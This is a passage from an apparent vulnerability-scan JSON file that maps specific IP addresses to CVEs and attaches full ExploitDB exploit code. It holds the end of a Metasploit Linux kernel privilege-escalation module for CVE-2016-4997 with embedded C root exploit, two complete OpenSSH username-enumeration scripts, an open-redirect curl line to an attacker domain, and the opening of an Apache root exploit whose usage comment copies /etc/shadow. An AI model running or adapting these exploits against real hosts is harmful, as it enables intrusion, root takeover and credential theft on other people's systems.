(uint32_t *)target;\r\n          *t = (uint32_t)kmatch;\r\n\r\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\r\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\r\n\r\n          for (i = 0; i < 0xffffff/2+1; i++) {\r\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\r\n          }\r\n\r\n          close(sock);\r\n          free(data);\r\n          printf(\"[+] Done! Now run ./pwn\\n\");\r\n\r\n          return 0;\r\n      }\r\n\r\n      int main(void) {\r\n          void *stack;\r\n          int ret;\r\n\r\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\r\n\r\n          ret = unshare(CLONE_NEWUSER);\r\n\r\n          if (ret == -1) {\r\n              perror(\"unshare\");\r\n              return -1;\r\n          }\r\n\r\n          stack = (void *) malloc(65536);\r\n\r\n          if (stack == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\r\n\r\n          sleep(1);\r\n\r\n          return 0;\r\n      }\r\n    }\r\n\r\n    # direct copy of code from exploit-db\r\n    pwn = %q{\r\n      #include <stdio.h>\r\n      #include <string.h>\r\n      #include <errno.h>\r\n      #include <unistd.h>\r\n      #include <stdint.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n      #include <assert.h>\r\n\r\n      #define MMAP_ADDR 0xff814e3000\r\n      #define MMAP_OFFSET 0xb0\r\n\r\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\r\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\r\n\r\n      void __attribute__((regparm(3))) privesc() {\r\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\r\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\r\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\r\n      }\r\n\r\n      int main() {\r\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\r\n          assert(payload == (void *)MMAP_ADDR);\r\n\r\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\r\n\r\n          memset(shellcode, 0, 0x300000);\r\n\r\n          void *ret = memcpy(shellcode, &privesc, 0x300);\r\n          assert(ret == shellcode);\r\n\r\n          printf(\"[+] Escalating privs...\\n\");\r\n\r\n          int fd = open(\"/dev/ptmx\", O_RDWR);\r\n          close(fd);\r\n\r\n          assert(!getuid());\r\n\r\n          printf(\"[+] We've got root!\");\r\n\r\n          return execl(\"/bin/bash\", \"-sh\", NULL);\r\n      }\r\n    }\r\n\r\n    # the original code printed a line.  However, this is hard to detect due to threading.\r\n    # so instead we can write a file in /tmp to catch.\r\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\r\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\r\n\r\n    # patch in to run our payload\r\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\r\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\r\n\r\n    def pwn(payload_path, pwn_file, pwn, compile)\r\n      # lets write our payload since everythings set for priv esc\r\n      vprint_status(\"Writing payload to #{payload_path}\")\r\n      write_file(payload_path, generate_payload_exe)\r\n      cmd_exec(\"chmod 555 #{payload_path}\")\r\n      register_file_for_cleanup(payload_path)\r\n\r\n      # now lets drop part 2, and finish up.\r\n      rm_f pwn_file\r\n      if compile\r\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\r\n        rm_f \"#{pwn_file}.c\"\r\n        write_file(\"#{pwn_file}.c\", pwn)\r\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\r\n        register_file_for_cleanup(\"#{pwn_file}.c\")\r\n      else\r\n        print_status \"Writing pwn executable to #{pwn_file}\"\r\n        write_file(pwn_file, pwn)\r\n      end\r\n      register_file_for_cleanup(pwn_file)\r\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\r\n    end\r\n\r\n    if not compile # we need to override with our pre-created binary\r\n      # pwn file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      pwn = fd.read(fd.stat.size)\r\n      fd.close\r\n      # desc file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      decr = fd.read(fd.stat.size)\r\n      fd.close\r\n\r\n      # overwrite the hardcoded variable names in the compiled versions\r\n      env_ready_file = '/tmp/okDjTFSS'\r\n      payload_path = '/tmp/2016_4997_payload'\r\n    end\r\n\r\n    # check for shortcut\r\n    if datastore['REEXPLOIT']\r\n      pwn(payload_path, pwn_file, pwn, compile)\r\n    else\r\n      rm_f desc_file\r\n      if compile\r\n        print_status \"Writing desc executable to #{desc_file}.c\"\r\n        rm_f \"#{desc_file}.c\"\r\n        write_file(\"#{desc_file}.c\", decr)\r\n        register_file_for_cleanup(\"#{desc_file}.c\")\r\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\r\n      else\r\n        write_file(desc_file, decr)\r\n      end\r\n      rm_f env_ready_file\r\n      register_file_for_cleanup(env_ready_file)\r\n      #register_file_for_cleanup(desc_file)\r\n      if not file_exist?(desc_file)\r\n        vprint_error(\"gcc failure output: #{output}\")\r\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\r\n      end\r\n      if target.name == \"Ubuntu\"\r\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      elsif target.name == \"Fedora\"\r\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      end\r\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\r\n      sec_waited = 0\r\n\r\n      until sec_waited > datastore['MAXWAIT'] do\r\n        Rex.sleep(1)\r\n        if sec_waited % 10 == 0\r\n          vprint_status(\"Waited #{sec_waited}s so far\")\r\n        end\r\n\r\n        if file_exist?(env_ready_file)\r\n          print_good(\"desc finished, env ready.\")\r\n          pwn(payload_path, pwn_file, pwn, compile)\r\n          return\r\n        end\r\n        sec_waited +=1\r\n      end\r\n    end\r\n  end\r\nend",
                "description": "Linux Kernel 4.6.3 (x86) - 'Netfilter' Local Privilege Escalation (Metasploit)",
                "author": "Metasploit",
                "_id": 40435,
                "source": "ExploitDB",
                "platform": "linux_x86",
                "date": "2016-09-27T00:00:00+00:00",
                "cve": [
                    "CVE-2016-4997"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2016-0778": [
            {
                "source": "CVE",
                "_id": "2016-0778",
                "description": "The (1) roaming_read and (2) roaming_write functions in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly maintain connection file descriptors, which allows remote servers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact by requesting many forwardings.",
                "osvdb": [],
                "bid": [
                    80698
                ],
                "cve": [
                    "CVE-2016-0778"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            }
        ],
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.115.9": {
        "CVE-2018-15473": [
            {
                "source": "CVE",
                "_id": "2018-15473",
                "description": "OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.",
                "osvdb": [],
                "bid": [
                    105140
                ],
                "cve": [
                    "CVE-2018-15473"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-15599",
                "description": "The recv_msg_userauth_request function in svr-auth.c in Dropbear through 2018.76 is prone to a user enumeration vulnerability because username validity affects how fields in SSH_MSG_USERAUTH messages are handled, a similar issue to CVE-2018-15473 in an unrelated codebase.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-15599"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/env python2\r\n# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io\r\n# Credits: Matthew Daley, Justin Gardner, Lee David Painter\r\n\r\n\r\nimport argparse, logging, paramiko, socket, sys, os\r\n\r\nclass InvalidUsername(Exception):\r\n    pass\r\n\r\n# malicious function to malform packet\r\ndef add_boolean(*args, **kwargs):\r\n    pass\r\n\r\n# function that'll be overwritten to malform the packet\r\nold_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[\r\n        paramiko.common.MSG_SERVICE_ACCEPT]\r\n\r\n# malicious function to overwrite MSG_SERVICE_ACCEPT handler\r\ndef service_accept(*args, **kwargs):\r\n    paramiko.message.Message.add_boolean = add_boolean\r\n    return old_service_accept(*args, **kwargs)\r\n\r\n# call when username was invalid \r\ndef invalid_username(*args, **kwargs):\r\n    raise InvalidUsername()\r\n\r\n# assign functions to respective handlers\r\nparamiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept\r\nparamiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username\r\n\r\n# perform authentication with malicious packet and username\r\ndef check_user(username):\r\n    sock = socket.socket()\r\n    sock.connect((args.target, args.port))\r\n    transport = paramiko.transport.Transport(sock)\r\n\r\n    try:\r\n        transport.start_client()\r\n    except paramiko.ssh_exception.SSHException:\r\n        print '[!] Failed to negotiate SSH transport'\r\n        sys.exit(2)\r\n\r\n    try:\r\n        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))\r\n    except InvalidUsername:\r\n        print \"[-] {} is an invalid username\".format(username)\r\n        sys.exit(3)\r\n    except paramiko.ssh_exception.AuthenticationException:\r\n        print \"[+] {} is a valid username\".format(username)\r\n\r\n# remove paramiko logging\r\nlogging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\r\n\r\nparser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')\r\nparser.add_argument('target', help=\"IP address of the target system\")\r\nparser.add_argument('-p', '--port', default=22, help=\"Set port of SSH service\")\r\nparser.add_argument('username', help=\"Username to check for validity.\")\r\n\r\nif len(sys.argv) == 1:\r\n    parser.print_help()\r\n    sys.exit(1)\r\n\r\nargs = parser.parse_args()\r\n\r\ncheck_user(args.username)",
                "description": "OpenSSH < 7.7 - User Enumeration (2)",
                "author": "Leap Security",
                "_id": 45939,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2018-12-04T00:00:00+00:00",
                "cve": [
                    "CVE-2018-15473"
                ],
                "type": "remote",
                "port": 22
            },
            {
                "code": "# Exploit: OpenSSH 7.7 - Username Enumeration\r\n# Author: Justin Gardner\r\n# Date: 2018-08-20\r\n# Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz\r\n# Affected Versions: OpenSSH version < 7.7\r\n# CVE: CVE-2018-15473\r\n\r\n###########################################################################\r\n#                ____                    _____ _____ _    _               #\r\n#               / __ \\                  / ____/ ____| |  | |              #\r\n#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #\r\n#              | |  | | '_ \\ / _ \\ '_ \\ \\___ \\\\___ \\|  __  |              #\r\n#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #\r\n#               \\____/| .__/ \\___|_| |_|_____/_____/|_|  |_|              #\r\n#                     | |               Username Enumeration              #\r\n#                     |_|                                                 #\r\n#                                                                         #\r\n###########################################################################\r\n\r\n#!/usr/bin/env python\r\n\r\nimport argparse\r\nimport logging\r\nimport paramiko\r\nimport multiprocessing\r\nimport socket\r\nimport sys\r\nimport json\r\n# store function we will overwrite to malform the packet\r\nold_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\r\n\r\n# create custom exception\r\nclass BadUsername(Exception):\r\n    def __init__(self):\r\n\tpass\r\n\r\n# create malicious \"add_boolean\" function to malform packet\r\ndef add_boolean(*args, **kwargs):\r\n    pass\r\n\r\n# create function to call when username was invalid\r\ndef call_error(*args, **kwargs):\r\n    raise BadUsername()\r\n\r\n# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\r\ndef malform_packet(*args, **kwargs):\r\n    old_add_boolean = paramiko.message.Message.add_boolean\r\n    paramiko.message.Message.add_boolean = add_boolean\r\n    result  = old_parse_service_accept(*args, **kwargs)\r\n    #return old add_boolean function so start_client will work again\r\n    paramiko.message.Message.add_boolean = old_add_boolean\r\n    return result\r\n\r\n# create function to perform authentication with malformed packet and desired username\r\ndef checkUsername(username, tried=0):\r\n\tsock = socket.socket()\r\n\tsock.connect((args.hostname, args.port))\r\n\t# instantiate transport\r\n\ttransport = paramiko.transport.Transport(sock)\r\n\ttry:\r\n\t    transport.start_client()\r\n\texcept paramiko.ssh_exception.SSHException:\r\n\t    # server was likely flooded, retry up to 3 times\r\n\t    transport.close()\r\n\t    if tried < 4:\r\n\t    \ttried += 1\r\n\t    \treturn checkUsername(username, tried)\r\n\t    else:\r\n\t    \tprint '[-] Failed to negotiate SSH transport'\r\n\ttry:\r\n\t\ttransport.auth_publickey(username, paramiko.RSAKey.generate(1024))\r\n\texcept BadUsername:\r\n    \t\treturn (username, False)\r\n\texcept paramiko.ssh_exception.AuthenticationException:\r\n    \t\treturn (username, True)\r\n\t#Successful auth(?)\r\n\traise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\r\n\r\ndef exportJSON(results):\r\n\tdata = {\"Valid\":[], \"Invalid\":[]}\r\n\tfor result in results:\r\n\t\tif result[1] and result[0] not in data['Valid']:\r\n\t\t\tdata['Valid'].append(result[0])\r\n\t\telif not result[1] and result[0] not in data['Invalid']:\r\n\t\t\tdata['Invalid'].append(result[0])\r\n\treturn json.dumps(data)\r\n\r\ndef exportCSV(results):\r\n\tfinal = \"Username, Valid\\n\"\r\n\tfor result in results:\r\n\t\tfinal += result[0]+\", \"+str(result[1])+\"\\n\"\r\n\treturn final\r\n\r\ndef exportList(results):\r\n\tfinal = \"\"\r\n\tfor result in results:\r\n\t\tif result[1]:\r\n\t\t\tfinal+=result[0]+\" is a valid user!\\n\"\r\n\t\telse:\r\n\t\t\tfinal+=result[0]+\" is not a valid user!\\n\"\r\n\treturn final\r\n\r\n# assign functions to respective handlers\r\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\r\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\r\n\r\n# get rid of paramiko logging\r\nlogging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\r\n\r\narg_parser = argparse.ArgumentParser()\r\narg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\r\narg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\r\narg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\r\narg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\r\narg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\r\ngroup = arg_parser.add_mutually_exclusive_group(required=True)\r\ngroup.add_argument('--username', type=str, help=\"The single username to validate\")\r\ngroup.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\r\nargs = arg_parser.parse_args()\r\n\r\nsock = socket.socket()\r\ntry:\r\n    sock.connect((args.hostname, args.port))\r\n    sock.close()\r\nexcept socket.error:\r\n    print '[-] Connecting to host failed. Please check the specified host and port.'\r\n    sys.exit(1)\r\n\r\nif args.username: #single username passed in\r\n\tresult = checkUsername(args.username)\r\n\tif result[1]:\r\n\t\tprint result[0]+\" is a valid user!\"\r\n\telse:\r\n\t\tprint result[0]+\" is not a valid user!\"\r\nelif args.userList: #username list passed in\r\n\ttry:\r\n\t\tf = open(args.userList)\r\n\texcept IOError:\r\n\t\tprint \"[-] File doesn't exist or is unreadable.\"\r\n\t\tsys.exit(3)\r\n\tusernames = map(str.strip, f.readlines())\r\n\tf.close()\r\n\t# map usernames to their respective threads\r\n\tpool = multiprocessing.Pool(args.threads)\r\n\tresults = pool.map(checkUsername, usernames)\r\n\ttry:\r\n\t\toutputFile = open(args.outputFile, \"w\")\r\n\texcept IOError:\r\n\t\tprint \"[-] Cannot write to outputFile.\"\r\n\t\tsys.exit(5)\r\n\tif args.outputFormat=='list':\r\n\t\toutputFile.writelines(exportList(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in List form.\"\r\n\telif args.outputFormat=='json':\r\n\t\toutputFile.writelines(exportJSON(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\"\r\n\telif args.outputFormat=='csv':\r\n\t\toutputFile.writelines(exportCSV(results))\r\n\t\tprint \"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\"\r\n\telse:\r\n\t\tprint \"\".join(results)\r\n\toutputFile.close()\r\nelse: # no usernames passed in\r\n\tprint \"[-] No usernames provided to check\"\r\n\tsys.exit(4)",
                "description": "OpenSSH 2.3 < 7.7 - Username Enumeration",
                "author": "Justin Gardner",
                "_id": 45233,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2018-08-21T00:00:00+00:00",
                "cve": [
                    "CVE-2018-15473"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.14.115.111": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1927": [],
        "CVE-2019-10098": [
            {
                "source": "CVE",
                "_id": "2019-10098",
                "description": "In Apache HTTP server 2.4.0 to 2.4.39, Redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an unexpected URL within the request URL.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-10098"
                ],
                "msb": []
            },
            {
                "code": "Normal URLs like http://redirect.local/test will be forwared to https://redirect.local/test. But by using newlines (CVE 2019-10098), we can redirect somewhere else (i.e. to `https://redirect.local.evilwebsite.com`):\r\n\r\n```\r\ncurl -Ik 'https://redirect.local/%0a.evilwebsite.com' --path-as-is\r\nHTTP/2 302 \r\ndate: Mon, 28 Oct 2019 03:36:58 GMT\r\ncontent-type: text/html; charset=iso-8859-1\r\nlocation: https://redirect.local.evilwebsite.com\r\n```",
                "description": "Apache Httpd mod_rewrite - Open Redirects",
                "author": "Sebastian Neef",
                "_id": 47689,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-10-14T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2019-0197": [
            {
                "source": "CVE",
                "_id": "2019-0197",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.34 to 2.4.38. When HTTP/2 was enabled for a http: host or H2Upgrade was enabled for h2 on a https: host, an Upgrade request from http/1.1 to http/2 that was not the first request on a connection could lead to a misconfiguration and crash. Server that never enabled the h2 protocol or that only enabled it for https: and did not set \"H2Upgrade on\" are unaffected by this issue.",
                "osvdb": [],
                "bid": [
                    107665
                ],
                "cve": [
                    "CVE-2019-0197"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1283": [
            {
                "source": "CVE",
                "_id": "2018-1283",
                "description": "In Apache httpd 2.4.0 to 2.4.29, when mod_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a \"Session\" header. This comes from the \"HTTP_SESSION\" variable name used by mod_session to forward its data to CGIs, since the prefix \"HTTP_\" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications.",
                "osvdb": [],
                "bid": [
                    103520
                ],
                "cve": [
                    "CVE-2018-1283"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0211": [
            {
                "source": "CVE",
                "_id": "2019-0211",
                "description": "In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.",
                "osvdb": [],
                "bid": [
                    107666
                ],
                "cve": [
                    "CVE-2019-0211"
                ],
                "msb": []
            },
            {
                "code": "<?php\r\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\r\n# Charles Fol\r\n# @cfreal_\r\n# 2019-04-08\r\n#\r\n# INFOS\r\n#\r\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\r\n#\r\n# USAGE\r\n#\r\n# 1. Upload exploit to Apache HTTP server\r\n# 2. Send request to page\r\n# 3. Await 6:25AM for logrotate to restart Apache\r\n# 4. python3.5 is now suid 0\r\n#\r\n# You can change the command that is ran as root using the cmd HTTP\r\n# parameter (GET/POST).\r\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\r\n#\r\n# SUCCESS RATE\r\n#\r\n# Number of successful and failed exploitations relative to of the number\r\n# of MPM workers (i.e. Apache subprocesses). YMMV.\r\n#\r\n# W  --% S   F\r\n#  5 87% 177 26 (default)\r\n#  8 89%  60  8\r\n# 10 95%  70  4\r\n#\r\n# More workers, higher success rate.\r\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\r\n# Generally, failure is due to all_buckets being relocated too far from its\r\n# original address.\r\n#\r\n# TESTED ON\r\n#\r\n# - Apache/2.4.25\r\n# - PHP 7.2.12\r\n# - Debian GNU/Linux 9.6\r\n#\r\n# TESTING\r\n#\r\n# $ curl http://localhost/cfreal-carpediem.php\r\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\r\n# $ ls -alh /usr/bin/python3.5\r\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\r\n#\r\n# There are no hardcoded addresses.\r\n# - Addresses read through /proc/self/mem\r\n# - Offsets read through ELF parsing\r\n#\r\n# As usual, there are tons of comments.\r\n#\r\n\r\n\r\no('CARPE (DIEM) ~ CVE-2019-0211');\r\no('');\r\n\r\nerror_reporting(E_ALL);\r\n\r\n\r\n# Starts the exploit by triggering the UAF.\r\nfunction real()\r\n{\r\n\tglobal $y;\r\n\t$y = [new Z()];\r\n\tjson_encode([0 => &$y]);\r\n}\r\n\r\n# In order to read/write what comes after in memory, we need to UAF a string so\r\n# that we can control its size and make in-place edition.\r\n# An easy 